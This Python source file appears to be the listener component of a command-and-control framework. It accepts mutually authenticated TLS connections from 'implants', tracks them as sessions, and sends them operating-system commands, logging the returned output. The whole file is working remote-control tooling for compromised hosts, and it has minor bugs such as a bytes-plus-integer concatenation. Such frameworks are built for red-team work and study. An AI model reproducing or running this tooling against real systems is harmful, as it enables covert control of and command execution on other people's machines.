#!/usr/bin/env python3

import logging
import socket
import ssl
import threading
import uuid
import sys
from certs.certs import Certs
from pb import implantpb_pb2
from queue import Queue


# A thread safe dict of sessions and their ids
class Sessions:
    def __init__(self):
        self._mutex = threading.Lock()
        self._sessions = dict()

    # Add a connection and an address
    def add(self, conn, addr) -> str:
        # TODO: make sure the id doesn't already exist in the _sessions dict
        self._mutex.acquire()
        id = str(uuid.uuid4())
        print ("################## conn:", conn)
        print ("################## addr:", addr)
        self._sessions[id] = (conn, addr)
        self._mutex.release()
        return id

    # Get the connection by the session ID
    def get(self, id):
        self._mutex.acquire()
        conn, addr = self._sessions[id]
        self._mutex.release()
        return (conn, addr)

    # Return a list of session IDs
    def list(self) -> list:
        self._mutex.acquire()
        ids = list(self._sessions.keys())
        self._mutex.release()
        return ids


class Listener:
    def __init__(self, requestq: Queue):
        self.sessions = Sessions()
        # Automatically generate CA certificates for the server
        self.certs = Certs("server", client=False)

        # Create an initial set of client certs
        self.client_certs = Certs("implant", client=True)
        ctx = self._mtls_cfg(self.client_certs)
        self.ssock = self._mkssock(ctx)

        # start accepting connections
        t = threading.Thread(target=self._accept, args=(requestq,))
        t.start()

    def _mtls_cfg(self, client_certs: Certs) -> ssl.SSLContext:
        # mTLS settings
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.verify_mode = ssl.CERT_REQUIRED
        ctx.load_cert_chain(certfile=self.certs.public_key, keyfile=self.certs.private_key)
        ctx.load_verify_locations(cafile=client_certs.rootCA)
        return ctx

    # Create a secure socket
    def _mkssock(self, ctx: ssl.SSLContext) -> ssl.SSLSocket:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 31337))
            s.listen()
            return ctx.wrap_socket(s, server_side=True)

    # Accept connections from implants
    def _accept(self, requestq: Queue):
        while True:
            conn, addr = self.ssock.accept()
            print(f"Accepted connection from {addr}")
            # conn.verify_client_post_handshake()
            threading.Thread(target=self._handle_conn, args=(requestq, conn, addr)).start()

    def _handle_conn(self, requestq: Queue, conn: ssl.SSLSocket, addr):
        # Send the registration to the handler
        data = conn.recv(1024)
        requestq.put((data, addr))

        # Add the session
        id = self.sessions.add(conn, addr)
        print(f"implant ID: {id}")

        # TODO: Authenticate the implant before sending a confirmation
        confirmation = implantpb_pb2.Message(
            message_type=implantpb_pb2.Message.MessageType.RegistrationConfirmation,
            data=implantpb_pb2.RegistrationConfirmation(id=id).SerializeToString()
        ).SerializeToString()
        conn.sendall(confirmation)

        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
        logging.info(f"Accepted connection from {addr} | {id}")


# Send data to implant
def session(conn: ssl.SSLSocket, userin):
    # Turn the cmd into a protobuf Message
    os_cmd = implantpb_pb2.OsCmd(cmd=userin)
    message = implantpb_pb2.Message(
        message_type=implantpb_pb2.Message.MessageType.OsCmd,
        data=os_cmd.SerializeToString()
    )
    conn.sendall(message.SerializeToString())
    data = conn.recv(1024)

    if not data:
        return 

    else:
        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
        # Decode the data into OsCmdOutput
        message = implantpb_pb2.Message()
        message.ParseFromString(data)
        if message.message_type == implantpb_pb2.Message.MessageType.OsCmdOutput:
            output = implantpb_pb2.OsCmdOutput()
            output.ParseFromString(message.data)
            logging.info(output.stdout)

            if output.HasField("status") and output.code != 0:
                return(b"Status code: " + output.code + b"\n")

            if len(output.stderr) > 0:
                return(b"stdout:\n" +output.stdout + b"\nstderr:\n" + output.stderr)

            else:
                return(output.stdout)
